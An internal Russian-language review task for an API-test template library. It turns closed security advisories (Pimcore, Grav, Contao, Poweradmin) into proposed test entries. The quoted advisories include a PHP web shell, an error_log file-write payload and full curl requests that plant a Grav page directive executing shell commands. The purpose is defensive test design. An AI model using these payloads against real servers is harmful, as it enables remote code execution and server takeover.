# Перекрёстное ревью новых идей выгрузки багов

Партия `ghsa-composer`, идей: 4; вариант пакета — без решений Claude — независимое ревью.
Этот файл целиком отдаётся другой LLM. Ответ модели вставить в чат внутренней сессии.

## Задание для модели

Ты — ревьюер библиотеки шаблонов API-тестов. Из реальных закрытых багов открытого проекта выделены паттерны,
для которых в библиотеке нет подходящей записи (`new`). Паттерны склеены в идеи (кластеры). Для каждой идеи реши,
становится ли она новой записью библиотеки. Суди по первоисточнику бага, а не по пересказу, и по индексу библиотеки
в конце файла.

Для каждой идеи ответь:

1. **Решение** — `accept` (новая запись) или `reject` (с причиной). Причины отказа, которые уже применялись:
   специфика конфигурации или внутренней логики одного продукта, не воспроизводимая тестом API другого продукта;
   идея уже покрыта существующей записью (назови её ID — тогда это пруф к ней, а не новая запись);
   слишком общая, чтобы стать шагом теста.
2. **Пересечение** — ID существующих записей, с которыми идея пересекается или дублирует их, и предложение:
   новая запись, шаг-вариант в существующей (`extends` к ID) или объединение с другой идеей этого списка.
3. **ID и файл** — подходят ли (ID: префикс файла, суть проверки, латиница и дефисы); если нет — твой вариант.
4. **Формулировка** — обобщена ли идея до проверки любого API (а не продукта из бага), верно ли направление
   (позитивная / негативная), нужны ли особые условия (инструменты, доступ к БД, к файлам стенда, две версии сервиса).
5. **Почему** — одна-две строки; при сомнении — цитата из бага.

Отдельно (после таблицы): идеи, которые стоит разбить на несколько записей или склеить, и паттерны, которые, по-твоему,
вообще не про API.

Принципы библиотеки (из README):

- Библиотека хранит **правила генерации проверок**, а не только готовые тест-кейсы.
- Одна запись = один проверяемый риск/инвариант.
- Протокол, полярность, набор тестов, приоритет и профиль запуска — независимые измерения.
- Цель - полноценное тестирование продукта, а не проверка соответствия контракту. Не доверяем никому: ни заказчику,
  ни аналитику, ни разработчику; контракт - лишь мнение разработчика о том, как работает продукт.
- Проверки соответствия контракту обязательны, но это лишь часть набора: к ним добавляются проверки по ТЗ,
  стандартам, практике и здравому смыслу.
- Ожидаемое поведение выводится из всех источников: ТЗ заказчика (ФТТ), внутренних ТЗ (ОТЗ, ЧТЗ), ПМИ, контракта,
  стандартов (RFC, OWASP), практики отрасли и здравого смысла - с указанием источника. Источник молчит - проверка всё
  равно выполняется; источники противоречат - это находка. Лучше завести баг о потенциальной проблеме, чем промолчать.
  Подробно - `../docs/decisions/0002-expected-behavior-sources.md`.
- Применимость определяется возможностями API, а не только названием метода.
- Для изменяющих операций проверяется не только ответ, но и состояние после операции.
- Неприменимость отличается от пробела покрытия.

Формат ответа — одна таблица на все идеи:

| # | Решение | Пересечение (ID) и что сделать | ID и файл | Формулировка / условия | Почему |
|---|---|---|---|---|---|
| 1 | accept/reject | — / extends ID / объединить с №N | ok / свой вариант | ok / замечание | ... |

В конце — 2–3 строки общего вывода: систематические ошибки кластеризации, если есть.

## Идея 1. Идентификаторы из пользовательского определения схемы (имена полей, таблиц, индексов), по которым сервер генерирует исходный код или DDL, не внедряют код и SQL — символы, закрывающие объявление (;, кавычки, скобки, комментарии), отклоняются 4xx или экранируются по правилам целевого языка; пара к RES-DB-OBJECT-NAMES (законные имена со спецсимволами работают)

### GHSA-9x44-4gxf-8c25 — Pimcore Vulnerable to Remote Code Execution via DataObject Class-Definition Field Name

Ссылка: https://github.com/advisories/GHSA-9x44-4gxf-8c25

- **Паттерн:** Пользовательские идентификаторы схемы проверяются по allowlist до генерации кода и DDL
- **Условие:** Пользователь с обычными правами редактора может создавать или импортировать определение схемы данных (имена полей), по которому сервер генерирует код и меняет таблицы
- **Действие:** Импортировать определение, где имя поля содержит символы, закрывающие объявление (;, кавычки, скобки), код и SQL-фрагмент
- **Ожидание:** Имя поля, не являющееся корректным идентификатором, отклоняется 4xx; код и DDL не генерируются
- **Источник ожидания:** OWASP Injection Prevention; CWE-94
- **Почему не подошла ближайшая запись:** INJ-TEMPLATE-SSTI — про шаблоны, INJ-SQL — про данные запроса; внедрение через идентификатор схемы в генерируемый исходный код в библиотеке не описано

Первоисточник:

````text
## Overview

A DataObject **class-definition field name** is concatenated, without an identifier allowlist, into the PHP class source that Pimcore generates for every DataObject class (`protected $<fieldName>;`). A user holding only the ordinary `objects` (DataObjects) permission can import a class definition whose field name closes the property and injects arbitrary PHP into the generated class file, achieving remote code execution on the server. The same unvalidated field name is also concatenated into ALTER TABLE DDL (`ADD COLUMN`/`ADD INDEX`), giving a parallel SQL-injection primitive. This is a sibling of CVE-2026-5394 (composite-index column SQL injection); that fix hardened only the `compositeIndices` sink and left the field-name path untouched.

## Impact

Any authenticated user with the `objects` permission — the standard permission for content editors who work with DataObjects, not an administrator or a dedicated "classes" permission — can:

1. **Execute arbitrary PHP on the server (RCE).** The injected code runs in the web application's PHP process when an object of the affected class is loaded (and is re-executed on every load), with full access to the application, its database credentials, secrets, and the host filesystem/OS — i.e. full server compromise.
2. **Execute arbitrary ALTER TABLE DDL (SQL injection)** against the DataObject store/query tables (drop columns, add indexes, corrupt schema).
**Confidence (read with the Reproduction section).** The RCE sink — the real builder emitting attacker PHP into the generated class body, that class loading, and its `__construct()` executing a shell command — is **runtime-confirmed in an isolated harness** (see Reproduction → "Lab confirmation"). The remaining links of the end-to-end chain are **reasoned from source but not yet run end-to-end on a live Pimcore**: (a) the Studio import path (`generateLayoutTreeFromArray` → `save`) preserving the field name without transform/reject; (b) the persistent-field DDL step not aborting the save (addressed by the ≤64-byte gadget); and (c) Pimcore instantiating the object (`new`, e.g. via `DataObject::getById()`) so `__construct()` fires — autoloading alone executes only top-level class-body code, not the constructor. Treat the RCE as **sink-confirmed + chain-reasoned**, not as a fully-executed live exploit.

Because the injected PHP executes with the privileges of the PHP runtime (typically the web-server user) and reaches the operating system — beyond the aut …[обрезано]
````

## Идея 2. Данные пользователя (поле формы, настройки, фронтматтер страницы), которые называют серверную функцию — источник данных, обработчик, callback, — не позволяют вызвать функцию вне allowlist в любой форме записи (строка, Класс::метод, массив класс-метод, вложенный callable) и с любыми аргументами; denylist опасных функций недостаточен

### GHSA-r94f-hx44-8jqf — Grav CMS vulnerable to remote code execution via .zip file upload

Ссылка: https://github.com/advisories/GHSA-r94f-hx44-8jqf

- **Паттерн:** Пользовательские данные не позволяют вызвать серверную функцию вне allowlist
- **Условие:** Поле настроек или формы может указывать серверную функцию-источник данных (callable), проверяемую по списку
- **Действие:** Указать функцию в альтернативной форме записи (массив пары класс-метод вместо строки) с аргументами атакующего
- **Ожидание:** Любая форма записи проходит одну и ту же проверку allowlist; запрещённые функции не вызываются
- **Источник ожидания:** CWE-94; OWASP Code Injection
- **Почему не подошла ближайшая запись:** INJ-UNSAFE-DESERIALIZATION и INJ-TEMPLATE-SSTI — другие механизмы; выбор вызываемой серверной функции через данные пользователя в библиотеке не описан

Первоисточник:

````text
### Summary

A logged-in user can run any command on the server. A settings field can fill itself by calling one of Grav's built-in routines, and a safety check is supposed to allow only harmless ones. The check only recognises a routine when its name is written as one piece of text; named as a pair of values instead, it is not examined at all and is passed as safe. Pointing such a field at the routine that unpacks ZIP archives writes a PHP file from an uploaded archive into the site's public folder, which the server then runs.

### Details

The check rejects known-dangerous routines and, for those belonging to a component, allows only a short approved list. Both of those cases only apply when the name arrives as a single string. The same routine can be named as a pair (the component and the routine inside it), and in that form the check matches neither case, skips both lists and answers "safe". Grav then calls it, with arguments the attacker supplies in the same field. Any routine shipped with Grav becomes callable.

The one used here is what Grav runs when installing a plugin from an archive. It takes an archive and a destination folder. It does check the names of the files inside, so an archive cannot escape with `../`, but the destination is used exactly as given, so naming the folder the website is served from drops the contents there. Getting the archive in is trivial: ZIP is an accepted upload type and the files inside are never examined, so an archive containing a PHP file uploads as ordinary media to a predictable address.

Everything is set up over the web. Saving a plugin's settings stores the values as sent, and the Flex Objects plugin treats each entry of its own directory list as the address of a file describing fields. Pointing that list at the settings file being saved makes one file act as both, so the malicious field is created through a normal settings save with no file edited on the server.

### PoC

1. Log in at `http://TARGET/login` (or `/admin`). The session cookie is the only credential needed below.

2. Build and upload the zip file. In the panel this is the Media tab; it is stored unchanged at `/user/media/evil.zip`.

   Zip the shell.php file with the php code mentioned below:
   ```
   shell.php:  <?php system($_GET['c']); ?>
   zip evil.zip shell.php
   ```

3. Send the request (attach your Cookie and X-API-Token):

   ```
   PATCH /api/v1/config/plugins/flex-objects
   Content-Type: application/json

   {
     "directories": [ …[обрезано]
````

### GHSA-f8wv-xp27-6gq7 — Grav: Blueprint dynamic-data bare-function branch is denylist-gated and omits error_log, giving arbitrary file write

Ссылка: https://github.com/advisories/GHSA-f8wv-xp27-6gq7

- **Паттерн:** Вызываемые по данным пользователя функции ограничены allowlist, а не denylist
- **Условие:** Поле страницы или формы может назвать серверную функцию-источник данных с аргументами
- **Действие:** Указать функцию, отсутствующую в списке запрещённых, но имеющую опасный эффект (запись в файл), с аргументами пути и содержимого
- **Ожидание:** Вызов отклоняется: допускаются только функции из allowlist
- **Источник ожидания:** CWE-94; OWASP Input Validation (allowlist)
- **Почему не подошла ближайшая запись:** Тот же механизм, что у GHSA-r94f-hx44-8jqf: выбор серверной функции через данные; записи в библиотеке нет

Первоисточник:

````text
## Affected versions and vulnerable location

- Confirmed on grav core at `78ebfc1` (tag 2.0.13).
- Sinks:
  - `system/src/Grav/Common/Data/Blueprint.php:455-458` `call_user_func_array($o, $params)` (bare-function dynamic-data provider).
  - Twin: `system/src/Grav/Framework/Flex/FlexDirectory.php:936-938` `call_user_func_array($function, $params)`.
- Validation gate: `Blueprint::isSafeDynamicCall()` at `Blueprint.php:514-536`.
  - `Class::method` branch (`:514-527`) uses a strict positive allowlist `self::$allowedDynamicCallables`.
  - Bare-function branch (`:530-534`) uses only a denylist: `if (is_string($function) && Utils::isDangerousFunction($function)) return false; return !self::paramsContainDangerousCallable($params);`.
- Denylist: `Utils::isDangerousFunction()` (`system/src/Grav/Common/Utils.php`, list around `:2020-2270`).

## Root cause

GHSA-7pgq/CVE-2026-64850 hardened the `Class::method` half of the dynamic-callable validation to a positive allowlist because a page-edit account could otherwise name any static method as a provider and reach file/secret gadgets. The bare-function half was left on a denylist (`isDangerousFunction`). Any bare PHP function not on that list executes.

`error_log` is not on the denylist (verified: no occurrence in `Utils.php`). `error_log($message, 3, $destination)` appends attacker-controlled `$message` to attacker-controlled file `$destination`, an arbitrary-file-append primitive. `paramsContainDangerousCallable()` (`:587-603`) only scans params for dangerous callable strings, so a PHP payload string and a destination path both pass. (`stream_socket_client`, `dl`, and `mb_send_mail` are likewise absent, giving SSRF/other primitives.)

## Attacker model

The same surface the published dynamic-data advisories accept as reachable: a `data-*@` directive in a form blueprint the Form plugin assembles from page frontmatter (GHSA-fj2p), or a `data@` field in a Flex directory/pages/users blueprint (GHSA-c4wf). A page-edit / blueprint-config account, no shell.

## Reachability trace

1. Author a blueprint field with a bare-function data directive, e.g.
   `data-options@: ['error_log', '<?php system($_GET[0]); ?>', 3, 'user/data/x.php']`.
2. `Blueprint::init()` resolves the directive; `isSafeDynamicCall('error_log', $params)` reaches the bare-function branch (`:530`), `isDangerousFunction('error_log')` is false, `paramsContainDangerousCallable([...])` is false (no callable strings), so it returns true.
3. `call_user_func_arra …[обрезано]
````

### GHSA-7pgq-cr25-xvc8 — Grav: Incomplete callable validation in blueprint dynamic fields allows arbitrary static method invocation and file disclosure

Ссылка: https://github.com/advisories/GHSA-7pgq-cr25-xvc8

- **Паттерн:** Строка Класс::метод в данных пользователя не вызывает произвольный статический метод
- **Условие:** Редактор страниц может задать во фронтматтере поля функцию-источник данных
- **Действие:** Указать полное имя статического метода (Класс::метод) с аргументами пути файла и открыть страницу анонимно
- **Ожидание:** Вызов отклоняется, допускаются только методы из allowlist
- **Источник ожидания:** CWE-470; OWASP Input Validation (allowlist)
- **Почему не подошла ближайшая запись:** Тот же механизм, что у GHSA-r94f-hx44-8jqf: выбор серверной функции через данные; записи в библиотеке нет

Первоисточник:

````text
### Summary
Grav CMS's blueprint dynamic-field callable guard can be bypassed with a fully-qualified `Class::method` string, letting an account with only page-editing rights (`admin.pages`, not super-admin) plant a directive in a page's form-field frontmatter that invokes an arbitrary public static PHP method with attacker-controlled arguments. Using built-in gadget methods this yields, at minimum, arbitrary reading of any server-readable file (disclosed to anonymous visitors of the crafted page) and arbitrary creation/copying of files and directories under the web-server account.

### Details
`Blueprint::isSafeDynamicCall()` (`system/src/Grav/Common/Data/Blueprint.php`, method around line 488) is meant to block dangerous callables named in a blueprint's dynamic-field directives (`data-*@`). It only consults its dangerous-name denylist when the callable string does **not** contain `::`:
```php
if (is_string($function) && !str_contains($function, '::') && Utils::isDangerousFunction($function)) {
    return false;
}
```
Any callable string containing `::` — i.e. every `Class::method` static call — skips the check entirely and is passed to `call_user_func_array()` at `Blueprint::dynamicData()` (`Blueprint.php`, around line 461) and `FlexDirectory::dynamicDataField()` (`system/src/Grav/Framework/Flex/FlexDirectory.php`, around line 937). There is no allowlist restricting which classes or methods may be invoked this way; only the call's *arguments* are (separately) scanned for smuggled dangerous callables, never the target itself.

`Utils::isDangerousFunction()` (`system/src/Grav/Common/Utils.php`) classifies any string containing a colon (`str_contains($name, ":")`) or a namespace backslash as dangerous — so a qualified `Class::method` string would be rejected *if* it ever reached this function. The `!str_contains($function, '::')` condition in `isSafeDynamicCall()` ensures it never does, which is what leaves qualified static calls entirely unscreened. (Whether the exemption was intended to admit legitimate `Class::method` option-providers is a plausible reading of the surrounding code, but the intent is not established here.)

This is an incomplete fix of two recently published advisories — one addressing page editors executing hidden callables via form-field settings, the other extending the same guard to Flex directories. The guard those fixes introduced never covered qualified static calls. Grav's own permission model separates page-content code execution  …[обрезано]
````

### GHSA-fj2p-qj2f-74v5 — Grav: Remote code execution via unrestricted callable in Blueprint::dynamicData()

Ссылка: https://github.com/advisories/GHSA-fj2p-qj2f-74v5

- **Паттерн:** Callable из данных страницы не позволяет вызвать произвольный метод
- **Условие:** Автор страниц может задать во фронтматтере формы функцию-источник данных
- **Действие:** Сохранить страницу с директивой, вызывающей публичный статический метод, который вызывает переданную функцию (system) с командой; открыть страницу анонимно
- **Ожидание:** Директива отклоняется, допускаются только методы из allowlist
- **Источник ожидания:** CWE-94; OWASP Input Validation (allowlist)
- **Почему не подошла ближайшая запись:** Тот же механизм, что у GHSA-r94f-hx44-8jqf: выбор серверной функции через данные; записи в библиотеке нет

Первоисточник:

````text
### Summary
An account with the `admin.pages` permission (or `api.pages.write`) can run shell
commands on the server. The command executes whenever anyone — including an
unauthenticated visitor — opens the page.

### Details
`Blueprint::dynamicData()` (system/src/Grav/Common/Data/Blueprint.php:426) passes
a `Class::method` string and its arguments straight to `call_user_func_array()`
with no allowlist. The form plugin runs page frontmatter through this path
(form/classes/Form.php:432), so a page author controls the input.
`Grav\Common\Utils::arrayFilterRecursive($source,$fn)`
(system/src/Grav/Common/Utils.php:1169) is a public static that calls
`$fn($key,$value)`, so passing `system` as `$fn` and a command as the array key
runs the command.

### PoC
Placeholders: `<BASE_URL>` the site; `<SESSION_COOKIE>` an admin session cookie
for an account with `admin.pages`; `<ADMIN_NONCE>` the `admin-nonce` on any admin
page (`window.GravAdmin.config.admin_nonce`).

Save a "form" page whose field carries the callable directive:

    curl '<BASE_URL>/admin/pages/rcepoc' \
      -H 'Cookie: <SESSION_COOKIE>' \
      --data-urlencode 'task=save' \
      --data-urlencode 'admin-nonce=<ADMIN_NONCE>' \
      --data-urlencode 'data[folder]=rcepoc' \
      --data-urlencode 'data[name]=form' \
      --data-urlencode 'data[title]=x' \
      --data-urlencode 'data[content]=hi' \
      --data-urlencode "data[frontmatter]=forms:
      x:
        fields:
          y:
            type: text
            data-opts@:
              - 'Grav\Common\Utils::arrayFilterRecursive'
              - { 'echo GRAV-RCE-OK; id': 'x' }
              - system"

Trigger it as an unauthenticated visitor:

    curl '<BASE_URL>/rcepoc'

Success check: the GET response body begins with `GRAV-RCE-OK` followed by the
web-server user's `id` output (a line starting `uid=...`) — the command ran
during the unauthenticated request and its output is reflected in the response.

### Impact
Shell command execution as the web-server user, triggered by any visit to the
page, plantable by any holder of `admin.pages` or `api.pages.write`.

Trust boundary: crossed. `admin.pages` (or `api.pages.write`) grants page
editing, not code execution; the holder plants the payload and the code runs at
request time on any later view of the page.
````

## Идея 3. Учётные данные, настроенные сервером для своего сайта или интеграции (Authorization, Cookie, ключи), не уходят в исходящие запросы к другим хостам — при обходе ссылок, проверке битых ссылок, следовании редиректам, загрузке по URL

### GHSA-3mr9-p497-58f6 — Contao crawler leaks auth credentials to external hosts

Ссылка: https://github.com/advisories/GHSA-3mr9-p497-58f6

- **Паттерн:** Исходящие запросы к внешним хостам не несут учётных данных, настроенных для своего сайта
- **Условие:** Сервер обходит ссылки (краулер, проверка битых ссылок) с учётными данными для своего домена
- **Действие:** Разместить на обходимой странице ссылку на подконтрольный внешний сервер и запустить обход; посмотреть заголовки пришедшего запроса
- **Ожидание:** Во внешний запрос не попадают Authorization, Cookie и другие учётные данные
- **Источник ожидания:** Здравый смысл; RFC 9110 §11 (учётные данные в пределах защищаемого пространства)
- **Почему не подошла ближайшая запись:** Ближайшая REST-SSRF-URL-FETCH проверяет адрес назначения исходящего запроса, а не утечку учётных данных в запросе к допустимому внешнему хосту

Первоисточник:

````text
### Summary
Contao's crawler tries to prevent confidential HTTP client options from being sent to external domains by creating a scoped client: full options for root page origins, cleaned options for everything else. The cleaner removes `Cookie` and `Authorization` headers, but it removes the non-Symfony option names `basic_auth` and `bearer_auth` instead of Symfony HttpClient's real `auth_basic` and `auth_bearer` options.

When `contao.crawl.default_http_client_options` contains Basic or Bearer authentication for a protected staging/production site, those credentials remain in the "clean" client used for external links or configured additional URIs. An attacker who can get an external URL crawled, for example through a link on a crawled page while the broken-link checker is enabled, can receive the crawler credentials.

## Technical Detail

### Root Cause

```php
// core-bundle/src/Crawl/Escargot/Factory.php:175-209 @ e550b92a01ef625bd546e6c3956dd200af05ebf0
private function createHttpClient(array $options = []): HttpClientInterface
{
    $options = array_merge_recursive(
        [
            'headers' => [
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent' => self::USER_AGENT,
            ],
            'max_duration' => 10,
        ],
        array_merge_recursive($this->getDefaultHttpClientOptions(), $options),
    );

    $cleanOptions = $this->cleanOptionsFromConfidentialData($options);

    if ($options === $cleanOptions) {
        return ($this->httpClientFactory)($options);
    }

    $scopedOptionsByRegex = [];

    foreach ($this->getRootPageUriCollection()->all() as $rootPageUri) {
        $scopedOptionsByRegex[preg_quote($this->getOriginFromUri($rootPageUri))] = $options;
    }

    return new ScopingHttpClient(($this->httpClientFactory)($cleanOptions), $scopedOptionsByRegex);
}
```

```php
// core-bundle/src/Crawl/Escargot/Factory.php:226-247 @ e550b92a01ef625bd546e6c3956dd200af05ebf0
foreach ($options as $k => $v) {
    if ('headers' === $k) {
        foreach ($v as $header => $value) {
            if (\in_array(strtolower($header), ['authorization', 'cookie'], true)) {
                continue;
            }

            $cleanOptions['headers'][$header] = $value;
        }

        continue;
    }

    if ('basic_auth' === $k || 'bearer_auth' === $k) {
        continue;
    }

    $cleanOptions[$k] = $v;
}
```

Symfony HttpClient authentication options are `auth_basi …[обрезано]
````

## Идея 4. Внешний идентификатор субъекта (OIDC sub, SAML NameID, ID в провайдере) сравнивается побайтно — без нормализации регистра, диакритики и Unicode; sub, отличающийся от sub жертвы только регистром или акцентом, даёт новую учётку или отказ, но не вход в чужую; пара к AUTH-LOGIN-IDENTIFIER-NORMALIZATION (там нормализация нужна)

### GHSA-cmwh-g2h8-c222 — Poweradmin: OIDC `sub` collation bypass in Poweradmin leading to account takeover

Ссылка: https://github.com/advisories/GHSA-cmwh-g2h8-c222

- **Паттерн:** Внешний идентификатор субъекта (OIDC sub) сравнивается побайтно
- **Условие:** Учётка привязана к sub внешнего IdP; сравнение в БД нечувствительно к регистру и акцентам
- **Действие:** Войти через IdP аккаунтом, sub которого отличается от sub жертвы регистром или диакритикой (victím-login)
- **Ожидание:** Новая учётка или отказ; вход в учётку жертвы невозможен
- **Источник ожидания:** OpenID Connect Core 1.0 §5.7 (sub уникален и сравнивается в пределах издателя)
- **Почему не подошла ближайшая запись:** Ближайшие AUTH-LOGIN-IDENTIFIER-NORMALIZATION и RES-UNIQUENESS-NORMALIZATION требуют одинаковой нормализации; здесь внешний идентификатор должен сравниваться без нормализации

Первоисточник:

````text
## Preface

Poweradmin maps OIDC identities into local users through `oidc_user_links.oidc_subject` plus `provider_id`. In the MySQL schema, the OIDC link table explicitly uses `utf8mb4_unicode_ci`, which is case-insensitive and accent-insensitive. OIDC `sub` is a stable external subject identifier and should be matched byte-for-byte within the issuer/provider scope.

The confirmed local PoC used two different OIDC users:

- Victim subject: `victim-login`
- Attacker subject: `victím-login` (`í`, U+00ED)

MySQL reported those two subjects as equal under `utf8mb4_unicode_ci`. After the victim linked their OIDC account, the attacker authenticated to the same provider with the attacker's own password and Poweradmin resolved the session to the victim's local account.

## Server Info

- **Application:** Poweradmin
- **Version:** `targets/poweradmin` git `e1f9c9a`
- **Database:** MySQL `8.4.10`, `character_set_server=utf8mb4`, `collation_server=utf8mb4_unicode_ci`
- **Access Permissions:** Any user who can create or control an account in the connected OIDC provider
- **Auth Method:** OIDC generic provider
- **Tools:** Docker Compose, local OIDC provider, Python PoC harness

**Affected Entry Point:**

```text
GET /oidc/login?provider=generic
GET /oidc/callback?code=...&state=...
```

Relevant request properties:

- Authentication: valid OIDC authorization code flow
- Trigger: attacker OIDC account has a `sub` that collides with a victim's linked `sub`
- Vulnerable field: OIDC `sub` stored and looked up as `oidc_user_links.oidc_subject`

## Root Cause Analysis

### part0 — `oidc_user_links.oidc_subject` uses an accent-insensitive collation

The MySQL schema defines the OIDC link table with `utf8mb4_unicode_ci`:

```sql
-- sql/poweradmin-mysql-db-structure.sql:341-356
CREATE TABLE `oidc_user_links` (
  `user_id` INT(11) NOT NULL,
  `provider_id` VARCHAR(50) NOT NULL,
  `oidc_subject` VARCHAR(255) NOT NULL,
  ...
  UNIQUE KEY `unique_subject_provider` (`oidc_subject`, `provider_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
```

In the PoC database:

```text
Field          Type          Collation
provider_id    varchar(50)   utf8mb4_unicode_ci
oidc_subject   varchar(255)  utf8mb4_unicode_ci

SELECT 'victim-login' = 'victím-login' COLLATE utf8mb4_unicode_ci;
-- accent_collision = 1
```

### part1 — OIDC `sub` flows into a normal SQL equality lookup

Poweradmin reads the subject from OIDC userinfo data. If no custom `subject` mapping is config …[обрезано]
````

## Идея 5. Поиск не раскрывает фрагменты защищённого контента пользователю без доступа

### GHSA-x2rp-9qf7-2fmq — Contao: Protected page content is disclosed to anonymous visitors after contao.search.index_protected is disabled

Ссылка: https://github.com/advisories/GHSA-x2rp-9qf7-2fmq

- **Действие:** Выполнить поиск анонимно по словам из защищённых страниц до и после смены настройки
- **Ожидание:** Результаты не содержат заголовков, URL и фрагментов защищённых страниц при любой настройке

Первоисточник:

````text
`ModuleSearch` decides whether to filter protected pages out of search results based on the current value of `contao.search.index_protected`, but the authorisation data lives per row in `tl_search`. Turning the setting off removes
the filter without removing the rows, so protected pages that were indexed while it was on are returned to unauthenticated visitors such as title, URL and context snippet, even though the pages themselves still answer 401.

## Impact

Disclosure of member-only page titles, URLs and indexed text to unauthenticated visitors through the site search. The pages themselves remain access-controlled, so this is not a page-access bypass.

## Credits

This security vulnerability was found by @iRevivalx .
````

## Индекс библиотеки

Все записи (493): ID | категория | заголовок.

```text
ASYNC-DEAD-LETTER | async | Необрабатываемые сообщения уходят в DLQ без блокировки очереди
ASYNC-EVENT-ORDERING | async | Нарушение порядка событий не портит состояние
ASYNC-EVENT-PATH-SAME-RULES | async | Событийный путь применяет те же фильтры и границы доступа, что и плановый
ASYNC-IDEMPOTENT-CONSUMER | async | Повторная доставка события обрабатывается однократно
ASYNC-JOB-CANCEL | async | Отмена фоновой задачи останавливает её и не оставляет частичных эффектов
ASYNC-JOB-LIFECYCLE | async | Фоновая задача проходит статусы и отдаёт результат
ASYNC-MESSAGE-VALIDATION | async | Входящие сообщения брокера валидируются по схеме так же, как HTTP-запросы
ASYNC-OUTBOUND-REQUEST-HEADERS | async | Исходящий запрос сервера содержит корректный Host, в том числе с нестандартным портом
ASYNC-RPC-ERROR-PROPAGATION | async | Ошибка обработчика в схеме запрос-ответ через брокер возвращается вызывающему
ASYNC-SCHEDULE-LONG-UPTIME | async | Задача по расписанию срабатывает и после длительной непрерывной работы процесса
ASYNC-SSE-STREAM | async | Потоковый ответ SSE работает для всех методов и отдаёт text/event-stream
ASYNC-WEBHOOK-RETRY | async | Неуспешная доставка вебхука повторяется с backoff и ограничением
ASYNC-WEBHOOK-SIGNATURE | async | Вебхуки подписаны, подпись проверяется, повтор отклоняется
ASYNC-WEBHOOK-URL-SSRF | async | URL вебхука не может указывать на внутренние адреса
AUTH-ACCOUNT-STATE-ALL-SCHEMES | security | Отключённая, заблокированная или истёкшая учётка не аутентифицируется ни одной схемой
AUTH-API-KEY-LIFECYCLE | security | API-ключи ограничены по правам, отзываются и не раскрываются
AUTH-BASIC-CREDENTIALS-SPECIAL-CHARS | security | Basic-аутентификация принимает пароль с двоеточием, пробелами и UTF-8
AUTH-BRUTE-FORCE-PROTECTION | security | Перебор паролей ограничивается
AUTH-CLIENT-ASSERTION-BINDING | security | Client assertion принимается только с ключом клиента, указанного в ней
AUTH-CLIENT-CERT-IDENTITY | security | Личность из сертификата клиента извлекается однозначно
AUTH-CONCURRENT-SESSIONS | security | Лимит одновременных сессий и устройств соблюдается
AUTH-COOKIE-ATTRIBUTES | security | Сессионные cookie имеют Secure, HttpOnly, SameSite и узкие Domain/Path
AUTH-CSRF | security | Изменяющие операции с cookie-аутентификацией защищены от CSRF
AUTH-EXTERNAL-IDP-MISSING-ATTRIBUTES | security | Вход через внешний IdP без необязательных атрибутов профиля обрабатывается по требованиям
AUTH-EXTERNAL-IDP-UNVERIFIED-EMAIL | security | Вход через внешний IdP не связывается с учёткой по неподтверждённому email
AUTH-GENERATED-SECRET-STRENGTH | security | Сгенерированные сервером секреты имеют стойкость не ниже требуемой алгоритмом
AUTH-IDENTITY-ATTRIBUTES-ALL-SCHEMES | security | Атрибуты идентичности, которые даёт источник, сохраняются при любом способе аутентификации
AUTH-JWT-ALG-CONFUSION | security | Подмена алгоритма RS256 на HS256 с публичным ключом не принимается
AUTH-JWT-ALG-NONE | security | JWT с alg=none отклоняется
AUTH-JWT-HEADER-INJECTION | security | Параметры kid, jku, x5u в заголовке JWT не позволяют подставить ключ
AUTH-JWT-TIME-CLAIMS | security | Токены с nbf/iat в будущем и без exp обрабатываются по политике
AUTH-JWT-VALID-ACCEPTED | security | Валидный токен принимается при всех поддерживаемых алгоритмах, наборах ключей и настройках claims
AUTH-LOGIN-IDENTIFIER-NORMALIZATION | validation | Логин (email, телефон) нормализуется одинаково при входе, создании и поиске
AUTH-LOGOUT-CLEARS-COOKIE | security | Выход снимает cookie сессии на клиенте
AUTH-LOGOUT-INVALIDATES | security | После выхода токен и сессия недействительны
AUTH-MFA-STEP-UP | security | Операции, требующие второго фактора, недоступны без него
AUTH-MFA-UNENROLLED-ERROR | security | Ошибка шага второго фактора у пользователя без зарегистрированного фактора — обычная 4xx
AUTH-OAUTH-PAR | security | Pushed Authorization Request действует как прямой запрос авторизации и не ограничивает длительность входа
AUTH-OAUTH-PUBLIC-CLIENT-CONSENT | security | Повторная авторизация публичного OAuth-клиента не выполняется без участия пользователя
AUTH-OAUTH-REDIRECT-STATE | security | OAuth/OIDC flow проверяет redirect_uri, state и PKCE
AUTH-OAUTH-RESOURCE-INDICATOR | security | Индикатор ресурса, не соответствующий аудитории клиента, даёт 400 invalid_target
AUTH-OTP-ATTEMPT-LIMIT | security | Количество попыток ввода одноразового кода ограничено
AUTH-OTP-BINDING | security | Одноразовый код привязан к получателю и операции
AUTH-OTP-EXPIRY | security | Одноразовый код перестаёт действовать после истечения срока
AUTH-OTP-REUSE | security | Одноразовый код нельзя использовать повторно и после выдачи нового
AUTH-OTP-SEND-LIMIT | security | Частота отправки кодов ограничена (SMS bombing)
AUTH-PASSWORD-CHANGE-REVOKES | security | Смена или сброс пароля завершает другие сессии
AUTH-PASSWORD-POLICY | security | Политика паролей применяется на сервере
AUTH-PASSWORD-RESET-TOKEN | security | Токен сброса пароля одноразовый, ограничен по времени и привязан к пользователю
AUTH-PROTOCOL-SESSION-OWNER-BINDING | security | Идентификатор протокольной сессии привязан к аутентифицированному владельцу
AUTH-REFRESH-PRESERVES-SCOPE | security | Refresh без параметра scope сохраняет scope исходной авторизации
AUTH-SESSION-FIXATION | security | Идентификатор сессии меняется после входа
AUTH-SESSION-NOT-BEFORE-LOGIN | security | Анонимный запрос не получает cookie сессии и не создаёт серверную сессию
AUTH-SESSION-TIMEOUT | security | Сессия истекает после простоя и абсолютного срока
AUTH-TOKEN-IN-URL | security | Учётные данные не передаются и не принимаются в URL
AUTH-TOKEN-INTROSPECTION | security | Интроспекция токена возвращает актуальное состояние и те же claims, что в токене
AUTH-TOKEN-RESERVED-CLAIMS | security | Пользовательские поля не переопределяют зарезервированные claims токена
AUTH-TOKEN-SENDER-CONSTRAINED | security | Обмен и обновление токена сохраняют привязку к отправителю (DPoP, mTLS)
AUTH-TOKEN-TYPE-CONFUSION | security | Refresh, ID или сервисный токен не принимается как access-токен
AUTH-USER-ENUMERATION | security | Ответы входа, регистрации и восстановления не раскрывают существование аккаунта
BIZ-CLIENT-PRICE-TAMPERING | business-logic | Цена, скидка и итог рассчитываются на сервере
BIZ-CONFIG-SCOPE-PRECEDENCE | business-logic | Настройка более узкого уровня имеет приоритет над глобальной
